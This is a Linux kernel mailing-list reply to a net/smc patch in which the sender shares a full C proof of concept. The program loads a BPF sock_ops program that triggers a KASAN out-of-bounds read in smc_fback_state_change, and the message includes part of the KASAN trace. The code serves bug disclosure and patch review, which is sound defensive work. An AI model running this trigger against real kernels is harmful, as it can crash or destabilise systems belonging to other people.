Received: from out203-205-221-239.mail.qq.com (out203-205-221-239.mail.qq.com [203.205.221.239])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4EC7D1A680E;
	Sun, 21 Jun 2026 11:29:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=203.205.221.239
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782041344; cv=none; b=T3JC7kulty+ArD3tl3wcK+3qlSCeMtFsz9lL/o7FuujdEtVxHXjRzb0j/yn/zERt7ub9FgTV8hZjaMAcKs4t/7YuHTl/LLHQ09VXq6GjPZmqaInXZoCS1j1+/ux0N/c/DBSP68s6ri9JMBZalpjZA+PZ44AYjGvcjefiQEYgIuo=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782041344; c=relaxed/simple;
	bh=rL57JaiUOHC1qiFgtgpKHdCLa1ymbOoJzTz01KqUKYE=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=Dnh93uxm+hPGlphJW/5WXrUquDiXP2aJpL+7bLmklHC0VGSEP7o7cg2JYS7LysjQXkkmYBdq+9Dfb/2HcJf+bjNnScXZtD2dutwce0xehD8Go2r7b0Q2q+uUDuIufzOuTF0g2AeEYvae4I9O2bBoVwAGA9XpHIsbZoJJi4f7sAw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=uF53iXao; arc=none smtp.client-ip=203.205.221.239
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="uF53iXao"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
	t=1782041314; bh=DmBi3wOFGWxORVVzo7KUN8GyCSjx2r5ZHl6IleBQF/g=;
	h=Date:Subject:To:Cc:References:From:In-Reply-To;
	b=uF53iXaoco/1dbOHPJVUPGr+cJ92GDL7vJzsXLqVJh2tpv88Tpq4tSHCaQ92FcJfT
	 yYLLNjUzbjd9CCnWYGQiHCZQcRFtiOfGhe1dSCeX7x+uOIVIDV9nuOmoTuJQf4T1ou
	 qnfVfD1pn7RFoCJxKjxkow8B7oxx+d98JmAUaPA0=
Received: from [192.168.3.157] ([115.156.144.140])
	by newxmesmtplogicsvrszc56-0.qq.com (NewEsmtp) with SMTP
	id 71F8266D; Sun, 21 Jun 2026 19:28:31 +0800
X-QQ-mid: xmsmtpt1782041311tvb4danci
Message-ID: <tencent_8E5C38BD467714A73238DE9E6454646EC407@qq.com>
X-QQ-XMAILINFO: N/WmRbclY25Ge55ZC1eeD+AYUgzLz0niYmsJ3IlPW9CdTYjvaKSiMB03AI4kHo
	 NxPqWeNeOakjwjneUJYjA2te6DbzNMHrXKnJSQ2mC9EIOkvhqTZJzAmOhYpbqs1BuLkhk1M+40sg
	 zQih5KUPIso/iyxdwdAzsazPNkV0hJmfzGlVjLYE3MCWFYVOoYFZUmV81nP1bZacce4UjL20dilG
	 wTZTr3E+zQRGA0BxgRwowPq3cGRIXqIwybXBhn/OyPzkS5aVlDprKBRkT9SmmrBiEQmP5gZhm739
	 bE8rkA+eFKwMLOO+RdNuCMaEQKmdNNxoGTFpzpw2Pmu6LzqTevfpSGrDaUjXueCDbObIammyM6N/
	 LI0z56akNEuETYE29qW34E8705qzm/t1GUng96ag+qMQiATFunpnGAZCCJtTjwebNkS0nrwkTXpg
	 cWT92/Bsts5bIV39sGW+1k1AwKgF5TocMoKHZvVUQdhAAOlHnHepPDSDw05mYrnp8ONb3cmVzNw3
	 5yIx6L/tdYyL+m5TWSnSno+KWW3iIIbjoS6L5E2EZT9oUBGXHMJfbyNPfTKaGsueWy6iE4YXUJX3
	 Lq44NDubFHJRBGhlH3JO7kN6k2HkConz062Qz5PYU67dLotpKH0NsZqXQ1AQNQX5NiCU2Utd+ksC
	 gh61tTNtElfX/zMZX4vImrL1GN1eA6Ei8gG12qbIIq+wJiNB4nZgWIx05vl80m84P0jmqzFMKRk6
	 tfJlnL9u9VJX1Lfh7IC+ulItulsCqX44Wzbz4V2iCJSdw6vywLqTVot+q+6tS2QK4jZTr2UMyvVY
	 CaKaJKLsCm3bj+iEj8/OGa9dQoB7nBX020Q+8IoO23jRtXpw65zyENMvpyGb8Vc5Kotq1ry48t7i
	 oWa04ZNYATLh/ZNlI22O057SZVJQlQoL4dInlBv2EWzGibzGUgTTYfo/KBYr0tWM/fNfozRfcUUX
	 567Cgz5DyEhaGopu8Q6DzVfQEkCuk+yAUwer6u2vDo3OrAN1C51HGkqASTH0oplkt2NjRZ99I6XM
	 X0BkEE0n2LVAfUbKrI7NOtEGvRUHzx1JVlHa9zCuy9gGGRnFRpPAXdBx0Gkd5egpfAF8xsCNGNhF
	 ReqqCc
X-QQ-XMRINFO: NyFYKkN4Ny6FuXrnB5Ye7Aabb3ujjtK+gg==
X-OQ-MSGID: <84741f7e-057a-4f34-883b-e2a3af1a6f20@qq.com>
Date: Sun, 21 Jun 2026 19:28:29 +0800
Precedence: bulk
X-Mailing-List: linux-s390@vger.kernel.org
List-Id: <linux-s390.vger.kernel.org>
List-Subscribe: <mailto:linux-s390+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-s390+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH net] net/smc: fix out-of-bounds read in
 smc_clcsock_data_ready()
To: sashiko-reviews@lists.linux.dev, Sechang Lim <rhkrqnwk98@gmail.com>
Cc: Vasily Gorbik <gor@linux.ibm.com>,
 Alexander Gordeev <agordeev@linux.ibm.com>, linux-s390@vger.kernel.org,
 bpf@vger.kernel.org, Heiko Carstens <hca@linux.ibm.com>
References: <20260614120931.4041687-1-rhkrqnwk98@gmail.com>
 <20260615120954.99EA21F000E9@smtp.kernel.org>
From: XIAO WU <xiaowu.417@qq.com>
In-Reply-To: <20260615120954.99EA21F000E9@smtp.kernel.org>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

  Hi Sechang,

I saw your v2 is coming — before you send it, I wanted to share a PoC
that triggers the `smc_fback_state_change` callback OOB that the Sashiko
review flagged.

Your patch restores `child->sk_data_ready`, but the other three fallback
callbacks (`sk_state_change`, `sk_write_space`, `sk_error_report`)
installed by `smc_fback_replace_callbacks()` remain inherited from the
listen socket and read the child's `sk_user_data` as an `smc_sock`.

I confirmed this by loading a BPF sock_ops program that calls
`bpf_sock_hash_update()` on the child socket, then sending data. The
BPF helper populates `sk_user_data` with a `sk_psock`, and the inherited
`smc_fback_state_change` misreads it.

[KASAN report — kernel 7.1.0-rc7-next-20260612, CONFIG_KASAN=y]

   BUG: KASAN: slab-out-of-bounds in smc_fback_state_change+0xb4/0xc0

   Call Trace:
    <TASK>
    smc_fback_state_change+0xb4/0xc0
    ...
    bpf_prog_... → bpf_sock_hash_update → sock_hash_update_common
      → sock_map_link → sk_psock_init

Full PoC (poc.c):
---8<----------------------------------------------------------------
/*
  * PoC: OOB read in smc_fback_state_change
  *
  * Trigger: force SMC fallback -> listen -> BPF sock_ops attaches
  * sk_psock via bpf_sock_hash_update() -> inherited smc_fback_state_change
  * misreads sk_psock as smc_sock -> KASAN OOB.
  *
  * gcc -o poc poc.c
  */
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 321
#endif

static int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{ return syscall(__NR_bpf, cmd, attr, size); }

static int create_sockhash(void)
{
     union bpf_attr attr = { .map_type = 15 /*BPF_MAP_TYPE_SOCKHASH*/,
         .key_size = 4, .value_size = 8, .max_entries = 64 };
     return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int load_prog(int map_fd)
{
     struct bpf_insn prog[] = {
         /* r2 = *(u32 *)(r1 + 0) */
         {0x61, 2, 1, 0, 0},
         /* if r2 != 2 (BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB) goto +8 */
         {0x55, 2, 0, 8, 2},
         /* *(u32 *)(r10 - 8) = 1 */
         {0x62, 10, 0, -8, 1},
         /* r3 = r10; r3 += -8 */
         {0xbf, 3, 10, 0, 0}, {0x07, 3, 0, 0, -8},
         /* r4 = 0 */
         {0xb4, 4, 0, 0, 0},
         /* r2 = map_fd (2 insns) */
         {0x18, 2, 0, 0, map_fd}, {0, 0, 0, 0, 0},
         /* call 70 (bpf_sock_hash_update) */
         {0x85, 0, 0, 0, 70},
         /* r0 = 0; exit */
         {0xb7, 0, 0, 0, 0}, {0x95, 0, 0, 0, 0},
     };
     union bpf_attr attr = { .prog_type = 8 /*BPF_PROG_TYPE_SOCK_OPS*/,
         .insns = (__u64)(unsigned long)prog, .insn_cnt = 
sizeof(prog)/sizeof(prog[0]),
         .license = (__u64)(unsigned long)"GPL" };
     return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int setup_cgroup(int prog_fd)
{
     mkdir("/sys/fs/cgroup", 0755);
     mount("none", "/sys/fs/cgroup", "cgroup2", 0, NULL);
     mkdir("/sys/fs/cgroup/poc", 0755);
     int cg_fd = open("/sys/fs/cgroup/poc", O_DIRECTORY|O_RDONLY);
     union bpf_attr attr = { .attach_type = 34 /*BPF_CGROUP_SOCK_OPS*/,
         .target_fd = cg_fd, .attach_bpf_fd = prog_fd };
     bpf(BPF_PROG_ATTACH, &attr, sizeof(attr));
     int procs_fd = openat(cg_fd, "cgroup.procs", O_WRONLY);
     char buf[32]; int len = snprintf(buf, sizeof(buf), "%d\n", getpid());
     write(procs_fd, buf, len);
     close(procs_fd); close(cg_fd);
     return 0;
}

int main(void)
{
     struct sockaddr_in addr = { .sin_family = AF_INET,
         .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
     socklen_t addrlen = sizeof(addr);
     int optval = 1;

     int map_fd = create_sockhash();
     int prog_fd = load_prog(map_fd);
     setup_cgroup(prog_fd);

     int smc_fd = socket(AF_SMC, SOCK_STREAM, 0);
     setsockopt(smc_fd, SOL_TCP, TCP_FASTOPEN, &optval, sizeof(optval));
     bind(smc_fd, (struct sockaddr *)&addr, sizeof(addr));
     getsockname(smc_fd, (struct sockaddr *)&addr, &addrlen);
     listen(smc_fd, 5);

     pid_t pid = fork();
     if (pid == 0) {
         usleep(100000);
         int cfd = socket(AF_INET, SOCK_STREAM, 0);
         connect(cfd, (struct sockaddr *)&addr, sizeof(addr));
         send(cfd, "hello", 5, 0);
         usleep(300000); close(cfd); _exit(0);
     }

     int new_fd = accept(smc_fd, NULL, NULL);
     if (new_fd >= 0) { char buf[64]; read(new_fd, buf, sizeof(buf)-1); 
close(new_fd); }
     waitpid(pid, NULL, 0);
     close(smc_fd); close(prog_fd); close(map_fd);
     printf("[+] Done. Check dmesg.\n");
     return 0;
}
---8<----------------------------------------------------------------
Compile: gcc -o poc poc.c

[1] 
https://sashiko.dev/#/patchset/20260614120931.4041687-1-rhkrqnwk98%40gmail.com

Thanks,
XIAO

